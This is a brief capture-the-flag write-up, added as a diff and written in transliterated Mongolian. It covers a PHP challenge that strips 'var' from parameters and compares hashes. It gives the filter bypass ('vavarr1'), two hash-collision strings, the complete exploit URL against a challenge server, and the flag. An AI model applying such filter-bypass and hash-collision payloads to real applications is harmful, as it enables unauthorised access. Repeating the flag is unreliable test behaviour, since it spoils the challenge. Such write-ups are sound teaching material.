@@ -1,0 +1,9 @@
+1. php code iig harhar url der 'var' gsn stringiig replace hiiged var1, var2 gsn huvisagchidad adilhan hashtei ghde uur utguud uguh ystoi
+2. 'var' replace iig bypass hiihed 'vavarr1' ged davj boln dundasn 'var' iig ustghar 'var1' uldene.
+3. ijil hash tai buyu hash collision guudig haij olno (https://github.com/spaze/hashes)
+    var1 = TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
+    var2 = TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
+
+    final payload : http://139.162.5.230:10237/?vavarr1=TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak&vavarr2=TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
+
+flag : HZ{1_h4te_arr@ys_17bcc66e3c}
